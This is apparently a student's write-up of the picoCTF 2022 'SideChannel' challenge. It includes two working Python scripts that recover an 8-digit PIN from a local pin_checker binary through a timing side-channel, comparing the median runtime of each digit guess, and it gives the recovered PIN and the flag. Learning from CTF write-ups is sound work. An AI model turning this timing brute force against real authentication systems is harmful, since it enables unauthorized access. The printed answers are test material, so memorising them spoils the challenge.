
# picoCTF 2022 — SideChannel

**Category:** Digital Forensics, **Difficulty:** Hard

---

## Author Notes

This is a problem from picoCTF 2022. It was a problem I solved back in high school, but I wanted to revisit it since it was my first introduction to Side Channels. I also used a very monkey patch-esque methodology for solving the problem, so I figured I'd redo it with some automated scripting. I also re-did this on a laptop with an M1 chip, and I didn't expect Docker to be such a hassle to work with for this :(.

---

## Challenge Overview

The challenge gives you a host address and port to connect to, that upon connection asks for a PIN. Depending on whether the entered PIN is correct, the service returns either 'Access denied' or the flag. The problem also provides the ELF file for the pin_checker program, which you can download and analyze on your local machine (The correct PIN is the same for both the provided ELF and the version running on saturn.picoctf.net)

---

## Initial Observations

My first course of action was to connect to the server and just see what was on it. Immediately I got hit with the pin checker program asking me for the PIN. Since the program starts itself upon connection, and the machine boots you out after entering a PIN, it's safe to assume not much can be done here. That's okay, because the problem actually provides you with that same pin checker program, so I can just run a local analysis on the file first. I decided to reverse engineer the program on Ghidra to see what information I could get, but the main function seemed too hefty to be decompiled. This makes sense as one of the hints says: "Attempting to reverse-engineer or exploit the binary won't help you." Luckily I was able to retrieve the length of the expected PIN as 8, which will be helpful later. Since I couldn't pull any more information from reversing the binary, I'd need a different approach. 

---

## The Side Channel

Since the program is expecting a PIN (Personal Identification Number), it's a safe assumption that it is only expecting printable digits (0-9). The hint also suggests the user reads about timing-based side channels. A side channel involves observing information of a physical implementation of a system to understand its functionality. This could be anything such as how much power a machine uses to make a computation, or the frequency of an electro-magnetic wave released by a device, or in this case, how much time it takes to check our PIN. Usually the latency that occurs over a network can introduce a lot of noise which may mess up a timing based analysis, but luckily for us we have a local version of pin_checker, and thus we can run this side channel directly on our machine. 

Before doing any sort of automation or brute force, I wanted to test a handful of manual entries to see what observations I could make. I started by testing out each digit a handful of times (0, 1,... ,9) using the 'time' command, but nothing notable (sample: time echo '0' | ./pin_checker). Every time the programs run time came out to ~0.2 seconds. This is not a bad sign, it just means there is probably some other check happening first that quits out after 0.2 seconds. Recalling from my initial observations, I remembered the expected PIN length was 8, so I ran the same experiment but with additional padding at the end of each digit. Immediately the run time bumped up to about ~0.4 second, which is a good sign that increasing the length did something, and upon testing with pin '40000000', the pin_checker program had a noticeably longer runtime of an additional ~0.2 seconds. I tested each about two more times to confirm this observation, and to my content it seemed this longer runtime was consistent. 

Through this simple analysis I was able to compile some key findings:

* The program expects an 8 digit pin, and does an initial check on the PIN length before doing any other sort of check/comparison
* Certain digits cause the program to run longer, and because of my inputs we can assume this is because the program is doing a left-to-right prefix comparison
* If we keep building off the 'correct' last digit (whichever caused the program to run longest), then we can append and repeat until we've constructed the whole pin

This is all great and certainly narrows down our algorithm, but it would still be too much busy work to manually test every entry, so my next step would be to automate this process.

---

## Scripting

The initial script was simple, just check every digit in position 0, then position 1, and so on and so forth:

```python
import subprocess
import time

BINARY = "./pin_checker"
DIGITS = "0123456789"
PIN_LEN = 8

def run_guess(guess):
    start = time.perf_counter()
    p = subprocess.run(
        [BINARY],
        input=guess + "\n",
        capture_output=True,
        text=True
    )
    end = time.perf_counter()
    out = (p.stdout or "") + (p.stderr or "")
    return end - start, out

def is_success(out):
    return "Access granted." in out

def is_wrong_length(out):
    return "Incorrect length." in out

known = ""

for i in range(PIN_LEN):
    best_digit = None
    best_time = -1.0

    for d in DIGITS:
        guess = known + d + "0" * (PIN_LEN - len(known) - 1)
        t, out = run_guess(guess)

        print(f"pos={i} guess={guess} time={t:.3f}s")

        if is_success(out):
            print(f"[+] recovered pin: {guess}")
            raise SystemExit

        if is_wrong_length(out):
            print(f"[!] wrong length for guess {guess!r}")
            raise SystemExit(1)

        if t > best_time:
            best_time = t
            best_digit = d

    known += best_digit
    print(f"[+] chose {best_digit}, current prefix = {known}, time = {best_time:.3f}s")

final_time, final_out = run_guess(known)
print(f"[+] final candidate: {known}")
print(final_out)

if is_success(final_out):
    print(f"[+] recovered pin: {known}")
else:
    print("[!] final candidate was not accepted")
```

Running this multiple times I kept getting different PINs, which is not ideal. Remember there is only one correct PIN, so the expected behaviour is that I should be getting a consistent output, which is the expected PIN. A key observation here is that across different executions of this program, the same pins have varying run times. A process does not exist in a vacuum, meaning many environmental factors can impact runtime (Ex: your machine may be running other processes that can slightly affect latency), so it is not consistent to run a single check and move on. To work around this slight noise, I incorporated some frequency analysis, in which the script tries each PIN 5 times (or any amount of times defined by the user), and then uses the median runtime for comparison. Ideally this should cause some convergence and cause any outliers to be ignored. The new and improved script was as follows:

```python
import subprocess
import time
from statistics import median

BINARY = "./pin_checker"
DIGITS = "0123456789"
PIN_LEN = 8
TRIALS = 5

def run_guess(guess):
    start = time.perf_counter()
    p = subprocess.run(
        [BINARY],
        input=guess + "\n",
        capture_output=True,
        text=True
    )
    end = time.perf_counter()
    out = (p.stdout or "") + (p.stderr or "")
    return end - start, out

def timed_guess(guess, trials=TRIALS):
    times = []
    last_out = ""
    for _ in range(trials):
        t, out = run_guess(guess)
        times.append(t)
        last_out = out
    return median(times), last_out, times

def is_success(out):
    return "Access granted." in out

def is_wrong_length(out):
    return "Incorrect length." in out

known = ""

for i in range(PIN_LEN):
    best_digit = None
    best_med = -1.0

    for d in DIGITS:
        guess = known + d + "0" * (PIN_LEN - len(known) - 1)
        med, out, samples = timed_guess(guess)

        print(f"pos={i} guess={guess} median={med:.3f}s samples={[round(x,3) for x in samples]}")

        if is_success(out):
            print(f"[+] recovered pin: {guess}")
            raise SystemExit

        if is_wrong_length(out):
            print(f"[!] wrong length for guess {guess!r}")
            raise SystemExit(1)

        if med > best_med:
            best_med = med
            best_digit = d

    known += best_digit
    print(f"[+] chose {best_digit}, current prefix = {known}, median = {best_med:.3f}s")

final_med, final_out, final_samples = timed_guess(known)
print(f"[+] final candidate: {known}")
print(final_out)

if is_success(final_out):
    print(f"[+] recovered pin: {known}")
else:
    print("[!] final candidate was not accepted")
```

Running the new and improved script I got the working PIN: 48390513

---

## Getting the Flag

All that there was left to do at this point was just take that PIN, connect to the remote host, and paste it in.
And just like that, we have our flag!!!

---

**Flag:** `picoCTF{t1m1ng_4tt4ck_914c5ec3}`
